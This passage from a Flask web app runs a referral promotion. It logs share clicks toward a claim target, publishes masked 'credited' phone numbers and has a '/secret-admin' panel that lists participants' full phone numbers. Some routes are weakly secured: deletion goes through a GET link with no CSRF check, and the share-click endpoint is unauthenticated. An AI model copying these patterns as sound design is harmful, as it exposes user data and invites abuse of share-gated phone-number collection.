        "SELECT COUNT(*) AS total FROM share_clicks WHERE referral_code = ?",
        (code,)
    ).fetchone()["total"]

    if current_count < target:
        conn.execute("""
            INSERT INTO share_clicks (referral_code, created_at)
            VALUES (?, ?)
        """, (code, datetime.utcnow().isoformat()))
        conn.commit()

    conn.close()
    return jsonify({"success": True})


# ============================================================
# UPLOADED IMAGE
# ============================================================

@app.route("/uploads/<filename>")
def uploaded_file(filename):
    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)


# ============================================================
# PUBLIC CREDITED NUMBER API
# ============================================================

@app.route("/api/credited-numbers")
def api_credited_numbers():
    conn = get_db()
    rows = conn.execute(
        "SELECT masked_phone FROM credited_numbers ORDER BY id DESC"
    ).fetchall()
    conn.close()
    return jsonify({
        "numbers": [row["masked_phone"] for row in rows]
    })


# ============================================================
# ADMIN LOGIN
# ============================================================

@app.route("/secret-admin", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session["admin_logged_in"] = True
            return redirect(url_for("admin_dashboard"))

        flash("Invalid login details.")

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <style>
        body { margin: 0; background: #f0f4f8; font-family: Arial, sans-serif; }
        .box { max-width: 420px; margin: 80px auto; background: white; padding: 25px; border-radius: 15px; }
        input { width: 100%; padding: 14px; margin: 8px 0; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #0077b6; color: white; border: 0; border-radius: 8px; font-weight: bold; }
    </style>
</head>
<body>
<div class="box">
    <h2>Admin Login</h2>
    {% with messages = get_flashed_messages() %}
        {% for message in messages %}
            <p>{{ message }}</p>
        {% endfor %}
    {% endwith %}
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">LOGIN</button>
    </form>
</div>
</body>
</html>
""")


# ============================================================
# ADMIN DASHBOARD
# ============================================================

@app.route("/secret-admin/dashboard")
@admin_required
def admin_dashboard():
    conn = get_db()
    total_users = conn.execute("SELECT COUNT(*) AS total FROM participants").fetchone()["total"]
    total_shares = conn.execute("SELECT COUNT(*) AS total FROM share_clicks").fetchone()["total"]
    total_credited = conn.execute("SELECT COUNT(*) AS total FROM credited_numbers").fetchone()["total"]
    recent_participants = conn.execute("""
        SELECT phone, referral_code, referred_by, created_at
        FROM participants ORDER BY id DESC LIMIT 30
    """).fetchall()
    conn.close()

    campaign = get_campaign()

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; background: #f0f4f8; font-family: Arial, sans-serif; }
        .container { max-width: 1100px; margin: auto; padding: 20px; }
        .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; }
        .card { background: white; padding: 20px; border-radius: 12px; }
        .number { font-size: 30px; font-weight: bold; }
        .actions { margin: 20px 0; display: flex; flex-wrap: wrap; gap: 10px; }
        .actions a { background: #0077b6; color: white; padding: 12px 15px; border-radius: 8px; text-decoration: none; }
        .danger { background: #c1121f !important; }
        table { width: 100%; border-collapse: collapse; background: white; }
        th, td { padding: 10px; border-bottom: 1px solid #ddd; text-align: left; }
        .table-wrap { overflow-x: auto; }
    </style>
</head>
<body>
<div class="container">
    <h1>Admin Dashboard</h1>
    <div class="cards">
        <div class="card">
            <div>Total Users</div>
            <div class="number">{{ total_users }}</div>
        </div>
        <div class="card">
            <div>Total Share Clicks</div>
            <div class="number">{{ total_shares }}</div>
        </div>
        <div class="card">
            <div>Credited Numbers</div>
            <div class="number">{{ total_credited }}</div>
        </div>
    </div>

    <div class="actions">
        <a href="{{ url_for('admin_edit') }}">Edit Campaign</a>
        <a href="{{ url_for('admin_credited_numbers') }}">Manage Credited Numbers</a>
        <a href="{{ url_for('home') }}">View Promotion</a>
        <a href="{{ url_for('admin_logout') }}" class="danger">Logout</a>
    </div>

    <div class="card">
        <h2>Current Campaign</h2>
        <p><strong>Heading:</strong> {{ campaign['heading'] }}</p>
        <p><strong>Referral Target:</strong> {{ campaign['referral_target'] }}</p>
    </div>

    <div class="card">
        <h2>Recent Participants</h2>
        <div class="table-wrap">
            <table>
                <tr>
                    <th>Phone</th>
                    <th>Referral Code</th>
                    <th>Referred By</th>
                    <th>Date</th>
                </tr>
                {% for person in recent_participants %}
                <tr>
                    <td>{{ person['phone'] }}</td>
                    <td>{{ person['referral_code'] }}</td>
                    <td>{{ person['referred_by'] or '-' }}</td>
                    <td>{{ person['created_at'] }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>
    </div>
</div>
</body>
</html>
""", total_users=total_users, total_shares=total_shares, total_credited=total_credited, campaign=campaign, recent_participants=recent_participants)


# ============================================================
# ADMIN CAMPAIGN EDITOR
# ============================================================

@app.route("/secret-admin/edit", methods=["GET", "POST"])
@admin_required
def admin_edit():
    campaign = get_campaign()

    if request.method == "POST":
        heading = request.form.get("heading", "").strip()
        message = request.form.get("message", "").strip()
        referral_target = request.form.get("referral_target", "20").strip()
        offer_heading = request.form.get("offer_heading", "").strip()
        offer_text = request.form.get("offer_text", "").strip()
        continue_button_text = request.form.get("continue_button_text", "").strip()
        small_note = request.form.get("small_note", "").strip()
        share_instruction = request.form.get("share_instruction", "").strip()
        share_button_text = request.form.get("share_button_text", "").strip()
        claim_button_text = request.form.get("claim_button_text", "").strip()
        claim_ready_text = request.form.get("claim_ready_text", "").strip()
        back_text = request.form.get("back_text", "").strip()
        privacy_link_text = request.form.get("privacy_link_text", "").strip()
        terms_link_text = request.form.get("terms_link_text", "").strip()
        comments_title = request.form.get("comments_title", "").strip()
        comment_input_placeholder = request.form.get("comment_input_placeholder", "").strip()
        comment_submit_text = request.form.get("comment_submit_text", "").strip()

        try:
            referral_target = int(referral_target)
            if referral_target < 1:
                referral_target = 20
        except ValueError:
            referral_target = 20

        image_name = campaign["image"]
        social_image_name = campaign["social_image"]

        image = request.files.get("image")
        if image and image.filename:
            if allowed_file(image.filename):
                filename = secure_filename(image.filename)
                filename = secrets.token_hex(8) + "_" + filename
                image.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
                image_name = filename

        social_image = request.files.get("social_image")
        if social_image and social_image.filename:
            if allowed_file(social_image.filename):
                filename = secure_filename(social_image.filename)
                filename = secrets.token_hex(8) + "_social_" + filename
                social_image.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
                social_image_name = filename

        conn = get_db()
        conn.execute("""
            UPDATE campaign
            SET
                heading = ?,
                message = ?,
                referral_target = ?,
                offer_heading = ?,
                offer_text = ?,
                continue_button_text = ?,
                small_note = ?,
                share_instruction = ?,
                share_button_text = ?,
                claim_button_text = ?,
                claim_ready_text = ?,
                back_text = ?,
                privacy_link_text = ?,
                terms_link_text = ?,
                comments_title = ?,
                comment_input_placeholder = ?,
                comment_submit_text = ?,
                image = ?,
                social_image = ?
            WHERE id = ?
        """, (
            heading, message, referral_target, offer_heading, offer_text,
            continue_button_text, small_note, share_instruction, share_button_text,
            claim_button_text, claim_ready_text, back_text, privacy_link_text,
            terms_link_text, comments_title, comment_input_placeholder, comment_submit_text,
            image_name, social_image_name, campaign["id"]
        ))
        conn.commit()
        conn.close()

        flash("Campaign updated successfully.")
        return redirect(url_for("admin_dashboard"))

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Campaign</title>
    <style>
        body { margin: 0; background: #f0f4f8; font-family: Arial, sans-serif; }
        .box { max-width: 700px; margin: 30px auto; background: white; padding: 25px; border-radius: 15px; }
        input, textarea { width: 100%; box-sizing: border-box; padding: 13px; margin: 8px 0 18px; }
        textarea { min-height: 90px; }
        button { width: 100%; padding: 14px; border: 0; border-radius: 8px; background: #0077b6; color: white; font-weight: bold; }
        a { display: block; text-align: center; margin-top: 15px; color: #0077b6; }
    </style>
</head>
<body>
<div class="box">
    <h1>Edit Campaign</h1>
    {% with messages = get_flashed_messages() %}
        {% for message in messages %}
            <p>{{ message }}</p>
        {% endfor %}
    {% endwith %}

    <form method="POST" enctype="multipart/form-data">
        <label>Heading</label>
        <input type="text" name="heading" value="{{ campaign['heading'] }}" required>

        <label>Message</label>
        <textarea name="message" required>{{ campaign['message'] }}</textarea>

        <label>Referral Target</label>
        <input type="number" name="referral_target" value="{{ campaign['referral_target'] }}" min="1" required>

        <label>Offer Box Heading</label>
        <input type="text" name="offer_heading" value="{{ campaign['offer_heading'] }}" required>

        <label>Offer Box Text</label>
        <textarea name="offer_text" required>{{ campaign['offer_text'] }}</textarea>

        <label>Continue Button Text</label>
        <input type="text" name="continue_button_text" value="{{ campaign['continue_button_text'] }}" required>

        <label>Small Note Text</label>
        <input type="text" name="small_note" value="{{ campaign['small_note'] }}" required>

        <label>Share Instructions Text (Invite Page)</label>
        <textarea name="share_instruction" required>{{ campaign['share_instruction'] }}</textarea>

        <label>Share Button Text (Invite Page)</label>
        <input type="text" name="share_button_text" value="{{ campaign['share_button_text'] }}" required>

        <label>Claim Ready Notification Text</label>
        <textarea name="claim_ready_text" required>{{ campaign['claim_ready_text'] }}</textarea>

        <label>Claim Button Text (Invite Page)</label>
        <input type="text" name="claim_button_text" value="{{ campaign['claim_button_text'] }}" required>

        <label>Back Link Text</label>
        <input type="text" name="back_text" value="{{ campaign['back_text'] }}" required>

        <label>Privacy Policy Link Text</label>
        <input type="text" name="privacy_link_text" value="{{ campaign['privacy_link_text'] }}" required>

        <label>Terms Link Text</label>
        <input type="text" name="terms_link_text" value="{{ campaign['terms_link_text'] }}" required>

        <label>Comments Section Title</label>
        <input type="text" name="comments_title" value="{{ campaign['comments_title'] }}" required>

        <label>Comment Input Placeholder</label>
        <input type="text" name="comment_input_placeholder" value="{{ campaign['comment_input_placeholder'] }}" required>

        <label>Comment Submit Button Text</label>
        <input type="text" name="comment_submit_text" value="{{ campaign['comment_submit_text'] }}" required>

        <label>Website Promotion Banner Image</label>
        <input type="file" name="image" accept=".jpg,.jpeg,.png,.webp">

        <label>Social Media Share Banner Image (Facebook / Twitter)</label>
        <input type="file" name="social_image" accept=".jpg,.jpeg,.png,.webp">

        <button type="submit">SAVE CAMPAIGN</button>
    </form>

    <a href="{{ url_for('admin_dashboard') }}">Back to Dashboard</a>
</div>
</body>
</html>
""", campaign=campaign)


# ============================================================
# ADMIN: CREDITED NUMBERS
# ============================================================

@app.route("/secret-admin/credited-numbers", methods=["GET", "POST"])
@admin_required
def admin_credited_numbers():
    if request.method == "POST":
        raw_numbers = request.form.get("numbers", "")
        raw_numbers = raw_numbers.replace(",", "\n")
        numbers = [item.strip() for item in raw_numbers.splitlines() if item.strip()]

        conn = get_db()
        for phone in numbers:
            masked = mask_phone(phone)
            if not masked:
                continue
            conn.execute("""
                INSERT INTO credited_numbers (masked_phone, created_at)
                VALUES (?, ?)
            """, (masked, datetime.utcnow().isoformat()))
        conn.commit()
        conn.close()

        flash("Credited numbers added successfully.")
        return redirect(url_for("admin_credited_numbers"))

    conn = get_db()
    credited = conn.execute("""
        SELECT id, masked_phone, created_at
        FROM credited_numbers ORDER BY id DESC
    """).fetchall()
    conn.close()

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credited Numbers</title>
    <style>
        body { margin: 0; background: #f0f4f8; font-family: Arial, sans-serif; }
        .container { max-width: 800px; margin: 30px auto; padding: 20px; }
        .box { background: white; padding: 25px; border-radius: 15px; margin-bottom: 20px; }
        textarea { width: 100%; min-height: 180px; box-sizing: border-box; padding: 13px; }
        button { width: 100%; padding: 14px; margin-top: 12px; border: 0; border-radius: 8px; background: #0077b6; color: white; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; border-bottom: 1px solid #ddd; text-align: left; }
        .delete { color: #c1121f; }
        a { color: #0077b6; text-decoration: none; }
    </style>
</head>
<body>
<div class="container">
    <div class="box">
        <h1>Credited Numbers</h1>
        <p>Add only numbers that you have actually credited. The public website will only display the masked version.</p>
        {% with messages = get_flashed_messages() %}
            {% for message in messages %}
                <p>{{ message }}</p>
            {% endfor %}
        {% endwith %}
        <form method="POST">
            <textarea name="numbers" placeholder="Enter one number per line" required></textarea>
            <button type="submit">ADD CREDITED NUMBERS</button>
        </form>
    </div>

    <div class="box">
        <h2>Current Public Notifications</h2>
        <table>
            <tr>
                <th>Number</th>
                <th>Date</th>
                <th>Action</th>
            </tr>
            {% for item in credited %}
            <tr>
                <td>{{ item['masked_phone'] }}</td>
                <td>{{ item['created_at'] }}</td>
                <td>
                    <a class="delete" href="{{ url_for('delete_credited_number', number_id=item['id']) }}" onclick="return confirm('Delete this notification?')">Delete</a>
                </td>
            </tr>
            {% endfor %}
        </table>
    </div>

    <a href="{{ url_for('admin_dashboard') }}">Back to Dashboard</a>
</div>
</body>
</html>
""", credited=credited)


# ============================================================
# DELETE CREDITED NUMBER
# ============================================================

@app.route("/secret-admin/credited-numbers/delete/<int:number_id>")
@admin_required
def delete_credited_number(number_id):
    conn = get_db()
    conn.execute("DELETE FROM credited_numbers WHERE id = ?", (number_id,))
    conn.commit()
    conn.close()
    return redirect(url_for("admin_credited_numbers"))


# ============================================================
# PRIVACY POLICY
# ============================================================

@app.route("/privacy")
def privacy():
    campaign = get_campaign()
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ campaign['privacy_link_text'] }}</title>
    <style>
        body { margin: 0; background: #f0f4f8; font-family: Arial, sans-serif; }
        .container { max-width: 700px; margin: auto; background: white; min-height: 100vh; padding: 25px; }
        h1 { text-align: center; }
        p { line-height: 1.7; }
        a { color: #0077b6; }
    </style>
</head>
<body>
<div class="container">
    <h1>{{ campaign['privacy_link_text'] }}</h1>
    <p>We respect your privacy and aim to handle information responsibly.</p>
    <p>Information submitted through this promotion may be used to operate the promotion and manage referral activity.</p>
    <a href="{{ url_for('home') }}">{{ campaign['back_text'] }}</a>
</div>
</body>
</html>
""", campaign=campaign)


# ============================================================
# TERMS
# ============================================================

@app.route("/terms")
def terms():
    campaign = get_campaign()
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ campaign['terms_link_text'] }}</title>
    <style>
        body { margin: 0; background: #f0f4f8; font-family: Arial, sans-serif; }
        .container { max-width: 700px; margin: auto; background: white; min-height: 100vh; padding: 25px; }
        h1 { text-align: center; }
        p { line-height: 1.7; }
        a { color: #0077b6; }
    </style>
</head>
<body>
<div class="container">
    <h1>{{ campaign['terms_link_text'] }}</h1>
    <p>By participating in this promotion, you agree to provide accurate information and use the platform responsibly.</p>
    <a href="{{ url_for('home') }}">{{ campaign['back_text'] }}</a>
</div>
</body>
</html>
""", campaign=campaign)


# ============================================================
# ADMIN LOGOUT
# ============================================================

@app.route("/secret-admin/logout")
def admin_logout():
    session.clear()
    return redirect(url_for("admin_login"))


# ============================================================
# HEALTH CHECK
# ============================================================

@app.route("/health")
def health():
    return jsonify({"status": "ok"})


# ============================================================
# START APP
# ============================================================

setup_database()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    debug_mode = (os.environ.get("FLASK_DEBUG", "0") == "1")
    app.run(host="0.0.0.0", port=port, debug=debug_mode)